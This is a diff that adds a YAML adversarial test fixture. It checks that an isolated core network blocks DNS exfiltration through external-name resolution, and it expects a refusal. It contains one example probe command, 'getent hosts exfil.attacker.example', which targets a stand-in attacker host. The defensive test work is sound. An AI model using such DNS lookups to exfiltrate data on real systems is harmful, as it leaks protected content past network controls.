@@ -1,0 +1,36 @@
+# de_egress_core_dns_isolation.yaml — dlp_egress adversarial payload.
+# Spec C §7 (connectivity-free enforcement), §9 class 3 (DNS exfil).
+# Schema: tests/adversarial/payload_schema.py.
+id: de-2026-013
+category: dlp_egress
+threat: >-
+  A compromised in-core module attempts to resolve an external hostname to
+  exfiltrate T3 content over DNS; in the split topology the core sits on an
+  internal-only network with no route to any external resolver, so external-name
+  resolution (getaddrinfo/getent) fails before any query leaves the host.
+note: >-
+  The kernel-observable proof (external-name resolution via getent/NSS failing
+  inside the core's routeless network) is docker-gated and lives in
+  tests/integration/egress/test_core_network_isolation_kernel.py
+  (test_internal_network_blocks_egress_and_dns -> EXTERNAL_DNS_BLOCKED). This
+  corpus entry is the always-on, non-docker ratchet: it asserts BOTH the shipped
+  compose precondition that MAKES that resolution fail AND that the kernel proof
+  still exists and still asserts the DNS hole is closed — so it adds a signal the
+  compose-invariant lint does not (anti-rot on the runtime proof), not a third
+  copy of that lint. Mirrors the sbx-2026-005/014 static-bytes pattern.
+ingestion_path: web.fetch
+payload:
+  attack: dns_exfil_via_external_name_resolution
+  probe: "getent hosts exfil.attacker.example  (external-name NSS resolution)"
+  structural_precondition: "alfred_internal.internal == true AND alfred-core not on alfred_external"
+expected_outcome: refused
+provenance: >-
+  Spec C §7 promotes the external-name-must-fail probe into the §9 corpus; §9
+  class 3 is DNS exfil. The core performs no client-side DNS — the gateway
+  resolves for both the proxy and the relay. ADR-0042 records the connectivity-
+  free cutover (internal:true + core off alfred_external). This entry asserts the
+  compose precondition and anti-rot on the kernel proof.
+references:
+  - "docs/superpowers/specs/2026-06-25-spec-c-egress-control-plane-design.md §7, §9"
+  - "docs/adr/0042-connectivity-free-core-cutover.md"
+  - "tests/integration/egress/test_core_network_isolation_kernel.py"
